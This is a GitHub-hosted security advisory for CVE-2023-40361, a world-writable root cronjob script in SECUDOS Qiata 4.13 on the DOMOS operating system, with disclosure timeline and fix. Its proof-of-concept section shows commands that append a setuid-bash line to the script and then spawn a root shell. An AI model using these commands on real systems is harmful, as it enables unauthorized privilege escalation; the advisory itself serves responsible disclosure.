
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvianic%2FCVE-2023-40361%2Fblob%2Fmain%2Fadvisory%2Fadvisory.md)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fvianic%2FCVE-2023-40361%2Fblob%2Fmain%2Fadvisory%2Fadvisory.md)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=vianic%2FCVE-2023-40361)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[vianic](/vianic)
/
**[CVE-2023-40361](/vianic/CVE-2023-40361)**
Public

* [Notifications](/login?return_to=%2Fvianic%2FCVE-2023-40361) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fvianic%2FCVE-2023-40361)
* [Star
   0](/login?return_to=%2Fvianic%2FCVE-2023-40361)

* [Code](/vianic/CVE-2023-40361)
* [Issues
  0](/vianic/CVE-2023-40361/issues)
* [Pull requests
  0](/vianic/CVE-2023-40361/pulls)
* [Actions](/vianic/CVE-2023-40361/actions)
* [Projects
  0](/vianic/CVE-2023-40361/projects)
* [Security](/vianic/CVE-2023-40361/security)
* [Insights](/vianic/CVE-2023-40361/pulse)

Additional navigation options

* [Code](/vianic/CVE-2023-40361)
* [Issues](/vianic/CVE-2023-40361/issues)
* [Pull requests](/vianic/CVE-2023-40361/pulls)
* [Actions](/vianic/CVE-2023-40361/actions)
* [Projects](/vianic/CVE-2023-40361/projects)
* [Security](/vianic/CVE-2023-40361/security)
* [Insights](/vianic/CVE-2023-40361/pulse)

## Files

 main
## Breadcrumbs

1. [CVE-2023-40361](/vianic/CVE-2023-40361/tree/main)
2. /[advisory](/vianic/CVE-2023-40361/tree/main/advisory)
/
# advisory.md

Copy path Blame  Blame
## Latest commit

## History

[History](/vianic/CVE-2023-40361/commits/main/advisory/advisory.md)109 lines (84 loc) · 5.34 KB main
## Breadcrumbs

1. [CVE-2023-40361](/vianic/CVE-2023-40361/tree/main)
2. /[advisory](/vianic/CVE-2023-40361/tree/main/advisory)
/
# advisory.md

Top
## File metadata and controls

* Preview
* Code
* Blame

109 lines (84 loc) · 5.34 KB[Raw](https://github.com/vianic/CVE-2023-40361/raw/refs/heads/main/advisory/advisory.md)

Product: SECUDOS Qiata

Vendor: SECUDOS GmbH

Tested Version: 4.13

Fixed Version: 4.14

Vulnerability Type: Improper Permissions on a cronjob - CWE-732

CVSSv3 Severity: [CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) (Score 7.8)

CVSSv4 Severity: [CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N) (Score 7.3

Solution Status: fixed

Manufacturer Notification: 2023-07-12

Solution Date: 2023-07-24

Public Disclosure: 2023-10-16

CVE Reference: CVE-2023-40361

Author of Advisory: Nico Viakowski

# Overview[[1]](#references):

> DOMOS is a hardened operating system from Secudos GmbH. This operating system is used as the base for various applications of the company. It offers a web interface to easily perform administrative tasks within the operating system.

> The SECUDOS Qiata software solution enables customers to exchange files securely. The existing infrastructure of a customer is used to implement the Qiata software providing a way so that the customer can handle sensible files in a simple, secure and traceable way.
>
> The DOMOS operating system from SECUDOS GmbH is used as the underlying system for the application. If offers a way to easily perform administrative tasks regarding the Qiata software and the system itself.

# Vulnerability Details:

After the initial setup of the DOMOS operating system and the Qiata software the system provides an administrator with a user called "admin", with the necessary permissions to administrate the Qiata software.

As the Qiata software generates thumbnails of the files send between customers and saving them on the DOMOS system the SECUDOS GmbH created a script (`previewRm.sh`) which takes care of the old thumbnails by deleting all thumbnails after a defined time. This script is delivered by default with the Qiata software and is executed on the system as a cronjob with `root` permission:

```
[admin@localhost ~]$ ls -al /etc/cron.daily/previewRm.sh
-rwxrwxrwx   1 root root  175 Jul 10 14:37 previewRm.sh
```

This is where it is possible to get `root` privileges as the user `admin`. Everybody on the system has read/write/execute permissions onto the script.

This enables an attacker to change the content of the script and let it be executed by the `root` user once a day.

# Proof of Concept (PoC):

For this to work the attacker will need to have initial access to the DOMOS operating system, which will be located within the customers infrastructure.

Keeping that in mind the following commands will provide the user, in this case the `admin` user with `root` privileges:

```
[admin@localhost ~]$ echo "chmod u+s /bin/bash" >> /etc/cron.daily/previewRm.sh
[admin@localhost ~]$ cat /etc/cron.daily/previewRm.sh
#!/bin/bash
#  Copyright 2009-2014 Qiata
#
#  This code is NOT free software.
#
#  This script deletes all generated preview files that are older than

LOCATION=/var/lib/fta/company/default/preview
OLDERTHAN=7
FILESCOUNT=`find $LOCATION -type f | wc -l`
if [ $FILESCOUNT -gt 0 ]; then
	find $LOCATION -mtime +$OLDERTHAN -type f -delete
	if [ "$?" != "0" ]; then
		logger -i -t previewRm problem deleting preview files.
	else
		logger -i -t previewRm from total $FILESCOUNT preview files,
		deleted files older than $OLDERTHAN days.
	fi
else
	logger -i -t previewRm no preview files found at all.
fi
chmod u+s /bin/bash

[admin@localhost cron.daily]$ ls -al /bin/bash
-rwsr-xr-x. 1 root root 1150560 Aug  3  2022 /bin/bash
[admin@localhost cron.daily]$ /bin/bash -p
bash-4.4# id
uid=1000(admin) gid=1000(admin) euid=0(root) groups=1000(admin)
bash-4.4# chown admin:admin previewRm.sh
bash-4.4# ls -al /etc/cron.daily/previewRm.sh
-rwxrwxrwx 1 admin admin 618 Aug 10 13:14 /etc/cron.daily/previewRm.sh
```

# Solution:

The permission of the `previewRm.sh` script should be changed, so that only the root user is able to change the content of the script.

# Disclosure Timeline

2023-07-10: Vulnerability discovered

2023-07-12: Vulnerability reported to manufacturer

2023-07-24: Solution provided by manufacturer

2023-10-16: Public disclosure of vulnerability

# References

[1] Vendor Website: [hhttps://www.qiata.de/](https://www.qiata.de/)

[2] Blog Post Advisory Thinking Objects Gmbh: <https://to.com/news/advisory-secudos-qiata-cve-2023-40361/>

[3] Blog Post Advisory SECUDOS GmbH: <https://www.secudos.de/news/penetrationstest-von-thinking-objects-sicherheit-auf-hoechstem-niveau>

[4] Personal Github Repository for Advisory: <https://github.com/vianic/cve-2023-40361>

# Credits

This security vulnerability was found by Nico Viakowski of Thinking Objects GmbH.

E-Mail: n.viakowski@pm.me

# Disclaimer

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible.

# Copyright

Creative Commons - Attribution (by) - Version 3.0

URL: <http://creativecommons.org/licenses/by/3.0/deed.en>

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

